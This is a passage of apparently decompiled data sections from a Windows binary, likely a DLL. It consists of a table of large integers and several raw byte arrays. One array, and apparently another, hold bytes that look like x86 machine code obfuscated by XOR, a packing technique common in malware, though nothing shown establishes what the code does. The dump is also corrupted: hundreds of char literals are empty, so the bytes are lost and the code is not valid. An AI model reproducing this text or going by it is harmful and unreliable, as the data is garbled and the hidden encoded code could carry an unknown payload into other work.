  4120407876,
  2432685052,
  2119198446,
  456645206,
  1294448910,
  675284406,
  3337597092,
  2743602204,
  447798145,
  2144823097,
  2440614443,
  4095700627,
  66528827,
  1720752771,
  2285842321,
  3982005033,
  1415595188,
  822605836,
  3752348958,
  3134189990,
  3974075134,
  2310549062,
  1729600340,
  40904684,
  3142119537,
  3727641801,
  813758939,
  1441219939,
  2627747691,
  4190602195,
  392705729,
  1913621113,
  3409403364,
  2924536156,
  1090475086,
  630778102,
  1938328494,
  384775958,
  4164977156,
  2636594876,
  606071073,
  1098405273,
  2950160523,
  3400555571,
  1001806317,
  1590814037,
  2961068103,
  3575246079,
  1814117218,
  155617242,
  3890819784,
  2190380656,
  3567185192,
  2985906576,
  1599530114,
  976312378,
  2198441895,
  3865981727,
  146900493,
  1839610549,
  2766225597,
  3246849029,
  791234839,
  1246688687,
  4084605490,
  2517737098,
  2025728920,
  500799264,
  1271526520,
  783173824,
  3221355986,
  2774942058,
  475961079,
  2033789519,
  2543230813,
  4075889637,
  85551949,
  1618925557,
  2396087015,
  3954630239,
  1385040322,
  938063226,
  3645243496,
  3156327632,
  3929137032,
  2404803376,
  1643763234,
  77490842,
  3181821191,
  3636527551,
  913224877,
  1393100821,
  2588832285,
  4280929957,
  294026167,
  1960953615,
  3453554834,
  2831068202,
  1175525688,
  594978176,
  1969669848,
  268532320,
  4272869234,
  2613670858,
  586261591,
  1201019119,
  2839129597,
  3428716869,
  116280694,
  1669984718,
  2368095452,
  3896637540,
  1366896633,
  874419009,
  3669042771,
  3218512619,
  3922131379,
  2359379211,
  1645146137,
  124341409,
  3193019196,
  3677759364,
  899256982,
  1358835246,
  2579059750,
  4242466974,
  309419404,
  1997988148,
  3459135145,
  2873723409,
  1172717315,
  545358779,
  1989271779,
  334912603,
  4250528073,
  2554222065,
  554074732,
  1147223764,
  2865662918,
  3483973502,
  943816662,
  1562821486,
  3012130428,
  3605973700,
  1876303193,
  179413473,
  3827176691,
  2172233803,
  3614034707,
  2987292587,
  1554105017,
  969309697,
  2164173212,
  3852014884,
  188129334,
  1850809486,
  2803263110,
  3262241342,
  752774956,
  1236915092,
  4034987017,
  2514925745,
  2068385187,
  506376475,
  1212076611,
  760835835,
  3287735273,
  2794547025,
  531214540,
  2060323956,
  2489432422,
  4043703774
}; // idb
_UNKNOWN unk_681FFE38; // weak
_UNKNOWN unk_681FFE78; // weak
_UNKNOWN unk_681FFEB8; // weak
_UNKNOWN unk_681FFEF8; // weak
char byte_681FFF4C[] = { '1' }; // weak
char byte_68200B08[176] =
{
  'Q',
  '',
  '\0',
  '',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\xFF',
  '\xFF',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\xFF',
  '\xFF',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '',
  '',
  '\xFF',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  ' ',
  '',
  '',
  '\xFF',
  '\0',
  '',
  '',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '`',
  '\0',
  '\x04',
  '\x10',
  '\0',
  '\0',
  '\0',
  '\0',
  '',
  '',
  '',
  '\xFF',
  '\0',
  '\0',
  '\0',
  '\0',
  '\x10',
  '\0',
  '',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\x18',
  '\x01',
  '',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '`',
  '\0',
  '\x04',
  '\x10',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\x90',
  '\xFF',
  '',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '',
  '\x10',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '9',
  '',
  '\0'
}; // idb
int dword_68200BB8[] = { 42265900 }; // weak
char byte_682023B0[2423] =
{
  '',
  '\f',
  '',
  '\\',
  '',
  '',
  '$',
  '',
  '',
  '',
  '',
  '\x0E',
  '',
  '',
  '$',
  'k',
  '',
  '',
  '',
  '\x0F',
  '$',
  '',
  '',
  '',
  '',
  '\'',
  '\\',
  '',
  'u',
  '',
  '',
  '',
  '',
  '',
  '',
  'o',
  '0',
  '3',
  '\x13',
  '3',
  'A',
  '\x8F',
  '',
  '',
  '\x1E',
  '',
  '',
  '\x0F',
  'u',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  'm',
  'B',
  '\x15',
  'B',
  '\r',
  '',
  'G',
  '',
  '',
  '',
  '',
  '',
  'G',
  '',
  '',
  '3',
  '',
  '0',
  '3',
  '\x13',
  '3',
  '',
  'P',
  '',
  '',
  '',
  'P',
  '',
  '',
  'O',
  '\x0E',
  '',
  'Q',
  'L',
  '',
  '',
  '',
  '',
  '',
  '',
  '3',
  '',
  '',
  '',
  '\x13',
  '3',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  'G',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  'G',
  '\x7F',
  '',
  '',
  '',
  '',
  '3',
  '\xFF',
  '',
  '\f',
  '',
  'E',
  '',
  'G',
  '',
  '',
  '',
  '',
  'O',
  ' ',
  '',
  'M',
  '!',
  'P',
  '',
  '',
  '',
  'm',
  '0',
  '3',
  '\x13',
  '3',
  'u',
  '',
  '',
  '',
  '',
  '',
  '\x1E',
  '',
  '',
  '7',
  '$',
  '',
  '',
  '',
  '',
  '6',
  '',
  'G',
  '',
  '',
  '',
  '',
  '',
  'G',
  '',
  '',
  'O',
  ' ',
  '',
  'Q',
  '',
  '\x0F',
  '%',
  '#',
  '',
  '',
  '',
  'u',
  'N',
  '',
  '',
  '\f',
  '',
  '',
  '',
  'w',
  '4',
  '',
  '\x1C',
  '3',
  '3',
  '3',
  '3',
  '3',
  'E',
  '',
  '',
  'E',
  '',
  '',
  'A',
  '',
  '',
  '',
  '',
  '',
  '',
  'E',
  '\x0E',
  '',
  '\r',
  '&',
  '',
  '',
  '',
  '\x0F',
  '',
  '',
  '4',
  '',
  '',
  'E',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  'G',
  '',
  '',
  'd',
  '',
  '',
  '',
  '',
  '',
  '\x9D',
  '',
  '',
  '',
  '',
  '\x8D',
  '',
  '\x8D',
  '\x9D',
  '\x8D',
  '',
  '\x8D',
  '',
  '\x8D',
  '',
  '\x8D',
  '',
  '\x8D',
  '',
  '\x8D',
  '',
  '',
  '',
  '',
  '3',
  '',
  '',
  '',
  '',
  '',
  '',
  '\x8D',
  '',
  '',
  '\xFF',
  '\x9D',
  '',
  'E',
  '\x1D',
  '',
  'O',
  ' ',
  '',
  '',
  '',
  'M',
  ' ',
  '',
  '',
  '',
  '',
  '',
  'A',
  '`',
  '',
  'L',
  '',
  '',
  '',
  '',
  'E',
  'Q',
  '\f',
  '',
  '',
  '',
  '',
  'E',
  'q',
  '\x04',
  '',
  '',
  '',
  '',
  'E',
  'y',
  '\x1C',
  '',
  '',
  '',
  '',
  'm',
  '4',
  '',
  '\x1C',
  '3',
  '3',
  '3',
  '3',
  '3',
  '',
  'E',
  '\x0E',
  '',
  '\r',
  '&',
  '',
  '',
  '',
  '\x17',
  '3',
  '\a',
  '',
  '',
  '\x14',
  '',
  '',
  '\x05',
  'u',
  'N',
  '',
  '',
  '\f',
  '',
  '',
  '7',
  '$',
  '',
  '',
  '',
  '',
  '6',
  '',
  '',
  'G',
  '',
  '',
  'd',
  '',
  '',
  '',
  '',
  'O',
  ' ',
  '',
  '\x8D',
  '',
  '\x8D',
  '',
  '\x8D',
  '',
  '\x8D',
  '\x90',
  '\x8D',
  '',
  '\x8D',
  '',
  '\x8D',
  '',
  '\x8D',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  'G',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  '4',
  '3',
  '',
  '',
  '4',
  '',
  '\x1C',
  '3',
  '',
  '\f',
  '',
  '\\',
  '',
  'H',
  'y',
  '',
  '',
  '',
  '$',
  '',
  '',
  '',
  '',
  '',
  '',
  'E',
  '\x0F',
  'E',
  ')',
  'O',
  ' ',
  '',
  '',
  'G',
  '',
  '',
  '',
  '',
  '',
  '',
  'G',
  '\x8D',
  '',
  '\r',
  ',',
  '',
  '',
  'G',
  '',
  '',
  '',
  '',
  '<',
  'G',
  '',
  '',
  'M',
  '5',
  '\x81',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  '\'',
  '<',
  'E',
  '',
  '0',
  '',
  'E',
  '\x0F',
  'u',
  'X',
  '',
  '',
  '/',
  '$',
  '',
  '',
  '',
  '',
  'E',
  '',
  '4',
  'u',
  'I',
  '',
  'O',
  '<',
  '$',
  '',
  '',
  '',
  '',
  'E',
  '',
  '8',
  'u',
  '',
  '',
  '\x9D',
  '\x1E',
  '$',
  '',
  '',
  '',
  '',
  'E',
  '',
  ' ',
  '',
  'A',
  '',
  '$',
  '',
  '\x05',
  'E',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  '3',
  '\x1C',
  'G',
  '',
  '$',
  'I',
  '\x1E',
  '',
  'H',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  '3',
  '',
  '4',
  'I',
  '\f',
  '',
  'H',
  '8',
  '',
  '',
  '',
  '',
  '',
  '',
  '3',
  '',
  '$',
  '',
  '',
  '',
  '3',
  '',
  ' ',
  'I',
  '\f',
  '',
  'I',
  ',',
  '',
  '',
  '',
  '',
  '',
  '',
  '0',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  '$',
  'L',
  '',
  '',
  '',
  'u',
  '6',
  '',
  'a',
  '\x0E',
  '',
  '\x04',
  '',
  '',
  'u',
  '',
  'q',
  '',
  '',
  '',
  '\x04',
  '',
  '',
  '',
  'G',
  '',
  '$',
  'M',
  '&',
  '',
  '',
  '',
  '',
  '',
  '@',
  '`',
  '',
  '',
  '',
  'E',
  '',
  '$',
  '\'',
  '\x02',
  '',
  'G',
  '',
  ' ',
  '3',
  '',
  '8',
  'E',
  '<',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  '$',
  '',
  '',
  '',
  '',
  'I',
  '\f',
  '',
  'H',
  'D',
  '',
  '',
  '',
  '',
  'O',
  '%',
  '',
  '$',
  '',
  '',
  '',
  '',
  'I',
  '\f',
  '',
  '',
  'G',
  '',
  '\r',
  '&',
  '',
  'E',
  '<',
  '\r',
  '$',
  '',
  '',
  '\x1C',
  '',
  '',
  'G',
  '',
  '',
  'I',
  '\f',
  '',
  '',
  'O',
  '\n',
  '',
  'O',
  '%',
  '',
  '/',
  '',
  '\'',
  '\x14',
  'E',
  '',
  '<',
  '',
  '',
  '4',
  '',
  '',
  '',
  '',
  '',
  '3',
  '',
  '4',
  'I',
  '\f',
  '',
  '',
  '',
  'E',
  '\v',
  '',
  '\f',
  'E',
  '\r',
  '',
  'M',
  '\r',
  '',
  '',
  '?',
  'g',
  '',
  'E',
  '',
  'G',
  '',
  '',
  'E',
  '',
  '',
  '',
  '\x1B',
  'G',
  '',
  '4',
  'E',
  '',
  '',
  '',
  '\x1B',
  'G',
  '',
  '8',
  'E',
  '',
  '',
  '',
  '\x1B',
  'G',
  '',
  '<',
  'E',
  '',
  '',
  '',
  '\x1B',
  'E',
  '',
  '',
  'O',
  '\f',
  '',
  'E',
  '\v',
  'A',
  '\x7F',
  'Z',
  '',
  '',
  '',
  'u',
  '',
  '',
  '',
  '',
  '?',
  'h',
  '',
  'E',
  '\x8F',
  '',
  'E',
  ' ',
  '',
  '\x0F',
  '',
  '',
  '\x9D',
  '',
  '',
  'E',
  ')',
  'O',
  ' ',
  '',
  'E',
  '\x03',
  'E',
  '\x14',
  'E',
  '',
  '0',
  '$',
  '',
  '',
  '',
  '',
  'I',
  '\f',
  '',
  '',
  'E',
  '',
  '4',
  '$',
  '\"',
  '',
  '',
  '',
  'E',
  '',
  '8',
  'G',
  '',
  '0',
  'G',
  '\x81',
  '4',
  '$',
  '',
  '',
  '',
  '',
  'I',
  '\f',
  '',
  '',
  'E',
  '',
  '<',
  'G',
  '',
  '0',
  'G',
  '\x81',
  '4',
  '$',
  '',
  '',
  '',
  '',
  'I',
  '\f',
  '',
  '\x8D',
  'E',
  '',
  ' ',
  'G',
  '',
  '0',
  'G',
  '\x81',
  '4',
  '$',
  '6',
  '',
  '',
  '',
  'I',
  '\f',
  '',
  '',
  'E',
  '',
  '$',
  'G',
  '',
  '0',
  'E',
  '5',
  'G',
  '',
  ' ',
  'G',
  '',
  '8',
  '$',
  'g',
  '',
  '',
  '',
  'I',
  '\f',
  '',
  '',
  'E',
  '\r',
  'G',
  '',
  '$',
  '$',
  '\x11',
  '',
  '',
  '',
  '',
  'E',
  '\x0E',
  'G',
  '',
  '0',
  'G',
  '\x81',
  '<',
  '$',
  '\x1B',
  '',
  '',
  '',
  'O',
  '\b',
  '',
  '',
  '',
  '',
  '',
  '',
  '\x0F',
  '',
  'E',
  '\n',
  'O',
  '\n',
  '',
  'G',
  '',
  '',
  '\n',
  '',
  'M',
  '',
  '',
  '',
  '',
  '',
  'O',
  '\n',
  '',
  'G',
  '',
  '',
  '<',
  '',
  '\x0F',
  '',
  '\f',
  '\'',
  '6',
  '',
  '\x9D',
  '',
  'E',
  '\n',
  '',
  '\f',
  'E',
  '\v',
  '\r',
  '+',
  '',
  '',
  '\v',
  'E',
  '4',
  '',
  '\x05',
  'F',
  '',
  'L',
  '5',
  '',
  '',
  '',
  '',
  '\x04',
  '',
  '\'',
  '%',
  '',
  '',
  '',
  '\x0F',
  '',
  '',
  '',
  'E',
  '\n',
  '',
  '\f',
  'E',
  '\v',
  '\r',
  '+',
  '',
  '',
  '\v',
  'E',
  '4',
  '',
  '\x1E',
  'F',
  '',
  '',
  '\x1C',
  '',
  '.',
  '\"',
  '',
  '',
  '',
  '\x0F',
  '',
  '\x9D',
  '',
  'E',
  '\n',
  '',
  '\f',
  'E',
  '\v',
  '\r',
  '+',
  '',
  '',
  '\v',
  'E',
  '4',
  '',
  '\x05',
  'F',
  '',
  'L',
  '5',
  '',
  '',
  '\n',
  '',
  '\x04',
  '',
  '',
  '\'',
  '$',
  '',
  '',
  '',
  '\x0F',
  'O',
  '\f',
  '',
  'G',
  '',
  '\x0F',
  '',
  '',
  '\x9D',
  '',
  '3',
  'E',
  '\n',
  '',
  '\x13',
  '',
  '',
  'G',
  '',
  'v',
  '',
  '<',
  '$',
  'O',
  '3',
  '3',
  '3',
  '',
  '\x04',
  '',
  '',
  '',
  '\'',
  '\'',
  '',
  '',
  '',
  '\x0F',
  'E',
  '4',
  '\'',
  '4',
  '',
  '\f',
  '\'',
  '8',
  'O',
  '\r',
  '',
  'G',
  '',
  '',
  '\x04',
  '\x0F',
  'O',
  '\r',
  '',
  'G',
  '',
  '',
  '\x04',
  '\x0F',
  'O',
  '\r',
  '',
  'G',
  '',
  '',
  '\x04',
  '\x0F',
  '\x1D',
  '-',
  '',
  '\x04',
  '',
  'G',
  '',
  '\x0F',
  'M',
  '.',
  '3',
  '3',
  '',
  '',
  '\r',
  '.',
  '',
  '',
  '\x1D',
  'G',
  '',
  '',
  '\x04',
  '\x0F',
  '',
  '',
  'G',
  '',
  '',
  '',
  'G',
  '',
  '',
  '',
  '',
  '\x1E',
  '\x1D',
  '%',
  'I',
  '\x05',
  '',
  '',
  '\r',
  '\x0E',
  '',
  '`',
  '',
  '',
  '',
  '',
  '\x0E',
  '',
  '\'',
  '<',
  'E',
  '\x1C',
  '',
  '',
  '\x0E',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  'E',
  '<',
  'O',
  '\n',
  '',
  'G',
  '',
  '',
  '\n',
  '',
  '\f',
  'E',
  '\r',
  '',
  'G',
  '',
  '',
  '',
  'G',
  '',
  '',
  '',
  '\n',
  'O',
  '\n',
  '',
  'I',
  '\x05',
  '',
  '',
  'G',
  '',
  '',
  '4',
  '',
  '',
  'G',
  '',
  '',
  '',
  '\x1C',
  '',
  '',
  'O',
  '\n',
  '',
  '',
  '\'',
  '%',
  'G',
  '',
  '',
  'G',
  '',
  '',
  '',
  '',
  '\n',
  '\x0F',
  '',
  ':',
  '\x0F',
  '',
  '',
  '\f',
  'O',
  '4',
  '',
  '',
  '',
  '',
  '\x05',
  'G',
  '',
  'J',
  'G',
  '',
  'B',
  '',
  '\x1B',
  '',
  '',
  '\x8D',
  '',
  '?',
  '',
  'z',
  'X',
  '',
  'K',
  '',
  '',
  '',
  '',
  '\x1D',
  '',
  '',
  '',
  '\'',
  '\x11',
  '\x8D',
  '',
  '\x04',
  '',
  '',
  '',
  '',
  '\f',
  '',
  '\x0F',
  '',
  '',
  '\f',
  '\x0F',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  'G',
  '',
  '',
  '',
  '',
  '$',
  '',
  '',
  '',
  '',
  '',
  '',
  'M',
  ')',
  '',
  '<',
  'E',
  '\x81',
  '',
  '$',
  '\x15',
  '',
  '',
  '',
  '$',
  '\x8F',
  '',
  '',
  '',
  '$',
  '',
  '',
  '',
  '',
  'I',
  '\f',
  '',
  'H',
  '/',
  '',
  '',
  '',
  'G',
  '',
  '',
  'G',
  '',
  '\x14',
  '$',
  '',
  '',
  '',
  '',
  '',
  '<',
  '',
  '',
  '',
  '=',
  '',
  '',
  '',
  '>',
  '',
  '',
  '%',
  'z',
  '',
  '',
  '',
  'G',
  '\x81',
  '',
  'G',
  '',
  '',
  'E',
  '\x8D',
  '',
  '',
  '\f',
  'D',
  '\x8D',
  '',
  '%',
  'S',
  '',
  '',
  '',
  '$',
  '',
  '',
  '',
  '',
  '%',
  'y',
  '',
  '',
  '',
  'G',
  '',
  '',
  'G',
  '\x8F',
  '$',
  'G',
  '',
  '\xFF',
  '',
  '',
  'G',
  '',
  '',
  '\xFF',
  '',
  '',
  'G',
  '',
  '',
  '\xFF',
  '',
  '',
  '',
  '\x8F',
  '',
  'E',
  '\x0F',
  '',
  '',
  'G',
  '\x81',
  '',
  '',
  '=',
  'G',
  '',
  '',
  '',
  '',
  '$',
  '>',
  '',
  '',
  '',
  'A',
  '',
  '',
  '',
  '',
  '',
  '3',
  '',
  '',
  'I',
  '\f',
  '',
  '',
  'E',
  '',
  '',
  'E',
  '',
  '',
  '',
  '\x13',
  '',
  ';',
  '',
  '',
  '',
  '\x13',
  '',
  '\v',
  '',
  'E',
  '>',
  'G',
  '',
  '',
  'G',
  '',
  '<',
  'E',
  '\x15',
  '?',
  'h',
  '',
  'E',
  '\x15',
  '\r',
  '%',
  '',
  'G',
  '',
  '',
  '',
  '',
  'O',
  '\n',
  '',
  '.',
  '5',
  '',
  '\x1C',
  '',
  '\n',
  '',
  '',
  'G',
  '',
  '',
  '',
  'E',
  '*',
  '',
  '3',
  '\x1C',
  'E',
  '8',
  '',
  '$',
  'm',
  '',
  '',
  '',
  'G',
  '',
  '',
  '\x1D',
  '$',
  '',
  '\x05',
  'D',
  '\r',
  '',
  '%',
  'G',
  '',
  '',
  '\x04',
  'E',
  '',
  '',
  '$',
  '',
  '',
  '',
  '',
  '|',
  '',
  '\'',
  '',
  '|',
  '',
  '\'',
  '',
  '|',
  '',
  '\'',
  '',
  'G',
  '\x81',
  '',
  'x',
  '',
  '',
  '',
  '\x8D',
  '',
  'G',
  '',
  '',
  'E',
  '',
  '',
  '',
  '',
  '3',
  '',
  '',
  'A',
  '',
  '',
  'G',
  '\x81',
  '',
  'E',
  'D',
  '',
  '',
  '',
  '',
  'E',
  'd',
  '',
  '',
  '',
  '',
  '',
  't',
  '',
  '',
  'G',
  '\x81',
  '',
  '',
  '',
  '\x8D',
  '',
  'G',
  '',
  '',
  'E',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  'G',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  '\x0F',
  '',
  '\f',
  'D',
  '\x04',
  '\r',
  '%',
  '',
  '',
  '\x04',
  '\r',
  '%',
  '',
  '',
  '\x04',
  '\r',
  '%',
  '',
  '',
  '\x04',
  '\x0F',
  '\x9D',
  'G',
  '',
  '',
  'E',
  '\r',
  '',
  '\x05',
  '\x1D',
  ',',
  '',
  '\x04',
  'E',
  '',
  '',
  '',
  '\x0F',
  '',
  '$',
  '',
  '',
  '',
  '',
  'G',
  '',
  '',
  'G',
  '',
  '',
  'E',
  '',
  '',
  '',
  '\x0F',
  '',
  'G',
  '',
  '',
  'I',
  '\x17',
  '',
  '',
  '',
  '\f',
  'E',
  '\x13',
  'G',
  '\x81',
  '',
  '?',
  'f',
  '',
  '3',
  '',
  '',
  '',
  '\f',
  'E',
  '',
  '',
  'E',
  '',
  '',
  '',
  '\x0F',
  '',
  '',
  '',
  'E',
  '\x03',
  'G',
  '',
  '',
  'G',
  '',
  '$',
  '',
  '',
  '',
  '',
  'I',
  '\f',
  '',
  '',
  'O',
  '\x0E',
  '',
  'G',
  '',
  '$',
  '',
  '',
  '',
  '',
  'I',
  '\f',
  '',
  '',
  'E',
  '\x81',
  '',
  '',
  '',
  '',
  'A',
  '',
  '',
  '',
  '',
  '',
  '',
  'O',
  '\n',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  'E',
  '',
  '',
  '',
  '\f',
  '',
  '\'',
  '',
  '',
  '\f',
  '',
  '',
  '',
  '\x0F',
  '',
  '\f',
  '',
  '\r',
  '',
  '',
  '',
  '\x0F',
  '',
  '\x9D',
  '',
  '\x1E',
  '',
  'G',
  '\x9D',
  '',
  '',
  '\x06',
  '',
  '',
  '',
  '',
  'O',
  '\r',
  '',
  '\'',
  ';',
  '',
  'A',
  '\x8D',
  '',
  'O',
  '\f',
  '',
  '',
  '4',
  'E',
  '',
  '',
  'G',
  '\x8D',
  '4',
  'E',
  '',
  '',
  'E',
  '\x1D',
  '',
  '\x0F',
  '',
  '',
  '',
  '',
  '\x8D',
  '',
  '\x8D',
  '',
  '\x8D',
  '',
  '\x8D',
  '',
  '',
  'E',
  ')',
  '',
  'M',
  ' ',
  'L',
  '',
  '',
  '',
  '',
  'O',
  '(',
  '<',
  '$',
  'O',
  '',
  '',
  '',
  '',
  'E',
  '',
  '4',
  '',
  'E',
  '\x0F',
  'u',
  '',
  '',
  '\x9D',
  '\x1E',
  '$',
  '\"',
  '',
  '',
  '',
  '',
  'I',
  '\f',
  '',
  'H',
  '\x19',
  '',
  '',
  '',
  '',
  'E',
  '\n',
  'u',
  'X',
  '',
  '',
  '/',
  '$',
  '\x14',
  '',
  '',
  '',
  '',
  'I',
  '\f',
  '',
  'H',
  's',
  '',
  '',
  '',
  '',
  'E',
  '',
  '<',
  '',
  'E',
  '\v',
  'u',
  'I',
  '',
  'O',
  '<',
  '$',
  'r',
  '',
  '',
  '',
  '',
  'I',
  '\f',
  '',
  'H',
  'i',
  '',
  '',
  '',
  '',
  'E',
  '',
  '$',
  '',
  'A',
  '\x81',
  '\x1C',
  '\x81',
  '',
  '\f',
  '',
  'E',
  '\r',
  '',
  'E',
  '',
  '\x1C',
  '',
  'E',
  '\x0E',
  '}',
  '',
  '3',
  '\x1A',
  '',
  'G',
  '',
  '\x1C',
  '',
  'I',
  '\f',
  '',
  'H',
  '',
  '',
  '',
  '',
  'G',
  '',
  '\x1C',
  '',
  '',
  '\x05',
  '3',
  '\x1B',
  '',
  'I',
  '\f',
  '',
  'H',
  '',
  '',
  '',
  '',
  '',
  'E',
  '\x0F',
  '',
  '',
  '\x05',
  '',
  'E',
  '\x05',
  '',
  'G',
  '',
  '\x1C',
  '',
  'E',
  '\x0E',
  '}',
  '',
  '3',
  '\x1A',
  '',
  'I',
  '\f',
  '',
  'I',
  '\x9D',
  '',
  '',
  '',
  '',
  'E',
  '\x14',
  '',
  '',
  '4',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  'G',
  '',
  '\x1C',
  'M',
  '&',
  '',
  '',
  '',
  '',
  '',
  '@',
  '\xFF',
  '',
  '',
  '',
  'E',
  '',
  '\x1C',
  '',
  '$',
  '',
  '',
  '',
  '',
  '',
  'E',
  '\x0E',
  '',
  'u',
  '6',
  '',
  'a',
  '\x0E',
  '',
  '',
  '\x06',
  '',
  '',
  'u',
  '',
  'q',
  '',
  '',
  '',
  '',
  '\x06',
  '',
  '\x06',
  '',
  'G',
  '',
  '$',
  '',
  'E',
  '\x15',
  '3',
  '',
  '$',
  '',
  'E',
  '<',
  '',
  '',
  '\x1E',
  '',
  'E',
  '\x0F',
  'G',
  '',
  '',
  '',
  '',
  '\x1C',
  '',
  'E',
  '\n',
  '',
  '',
  '\x05',
  '',
  'E',
  '\x06',
  '',
  'G',
  '',
  '',
  '',
  'G',
  '',
  '',
  '',
  '',
  '\x1A',
  '',
  'O',
  '\n',
  '',
  '',
  's',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  '',
  'O',
  '5',
  '',
  '',
  'H',
  '\x01',
  '',
  '',
  '',
  '',
  'G',
  '',
  '',
  '',
  '4',
  '',
  '',
  '',
  'O',
  '\n',
  '',
  '',
  '3',
  '\x05',
  '\'',
  ')',
  'G',
  '',
  '',
  'G',
  '',
  '',
  '',
  '',
  '\n',
  '',
  'w',
  '2',
  '2',
  '2',
  '2',
  '2',
  '2',
  '2',
  '2',
  '',
  'O',
  '%',
  '',
  '',
  'O',
  '5',
  '',
  '',
  '@',
  'W',
  '',
  '',
  '',
  '',
  'G',
  '',
  '',
  '',
  '\x13',
  '',
  '',
  '',
  'G',
  'J',
  'T',
  '',
  '',
  '',
  '\x81',
  'I',
  '\f',
  '',
  '',
  '',
  'O',
  '\n',
  '',
  '\'',
  '\x14',
  '',
  'O',
  '\n',
  '',
  '',
  'E',
  '',
  ',',
  '',
  '',
  '\x05',
  'v',
  '<',
  '',
  '',
  '',
  '3',
  '',
  '<',
  '',
  'I',
  '\f',
  '',
  '',
  '',
  'E',
  '\r',
  '',
  '',
  '\f',
  'u',
  '',
  '',
  '',
  '',
  '',
  'E',
  '\x03',
  '?',
  'g',
  '',
  'E',
  '\x03',
  '',
  'O',
  '\v',
  '',
  '',
  'A',
  '',
  ']',
  '',
  '',
  '',
  '',
  '',
  '\x05',
  '',
  'u',
  '',
  '',
  '?',
  'h',
  '\x81',
  'E',
  '',
  '',
  'G',
  '',
  '4',
  '',
  'E',
  '',
  '',
  '',
  '',
  '\x13',
  '',
  'G',
  '',
  '<',
  '',
  'E',
  '',
  '',
  '',
  '',
  '\x13',
  '',
  'G',
  '',
  '$',
  '',
  'E',
  '',
  '',
  '',
  '',
  '\x13',
  '',
  'G',
  '',
  ',',
  '',
  'E',
  '',
  '',
  '',
  '',
  '\x13',
  '\x8D',
  'E',
  '',
  '',
  '',
  'G',
  '',
  ',',
  '',
  'O',
  '\f',
  '',
  '',
  'O',
  '\r',
  '',
  '',
  'E',
  '',
  ''
}; // idb
_BYTE byte_68202D27[1153] =
{
  69,
  32,
  141,
  147,
  141,
  146,
  141,
  145,
  141,
  144,
  146,
  147,
  145,
  151,
  15,
  159,
  158,
  157,
  153,
  132,
  69,
  41,
  132,
  77,
  32,
  204,
  205,
  204,
  204,
  155,
  132,
  69,
  3,
  132,
  69,
  20,
  132,
  69,
  73,
  204,
  51,
  51,
  51,
  36,
  119,
  204,
  204,
  204,
  132,
  69,
  73,
  196,
  51,
  51,
  51,
  36,
  132,
  205,
  204,
  204,
  132,
  69,
  73,
  220,
  51,
  51,
  51,
  132,
  71,
  73,
  204,
  51,
  51,
  51,
  132,
  71,
  65,
  196,
  51,
  51,
  51,
  36,
  86,
  205,
  204,
  204,
  132,
  69,
  73,
  212,
  51,
  51,
  51,
  132,
  71,
  73,
  204,
  51,
  51,
  51,
  132,
  71,
  65,
  196,
  51,
  51,
  51,
  36,
  67,
  205,
  204,
  204,
  132,
  69,
  73,
  236,
  51,
  51,
  51,
  132,
  71,
  73,
  204,
  51,
  51,
  51,
  132,
  71,
  65,
  196,
  51,
  51,
  51,
  36,
  72,
  205,
  204,
  204,
  132,
  69,
  73,
  228,
  51,
  51,
  51,
  132,
  71,
  73,
  204,
  51,
  51,
  51,
  132,
  69,
  53,
  132,
  71,
  89,
  236,
  51,
  51,
  51,
  132,
  71,
  81,
  220,
  51,
  51,
  51,
  36,
  195,
  205,
  204,
  204,
  132,
  69,
  73,
  252,
  51,
  51,
  51,
  132,
  71,
  73,
  228,
  51,
  51,
  51,
  132,
  71,
  65,
  252,
  51,
  51,
  51,
  36,
  153,
  205,
  204,
  204,
  170,
  69,
  14,
  132,
  71,
  73,
  204,
  51,
  51,
  51,
  132,
  71,
  65,
  212,
  51,
  51,
  51,
  36,
  133,
  205,
  204,
  204,
  147,
  132,
  77,
  8,
  204,
  205,
  204,
  204,
  145,
  149,
  150,
  151,
  15,
  154,
  155,
  132,
  253,
  58,
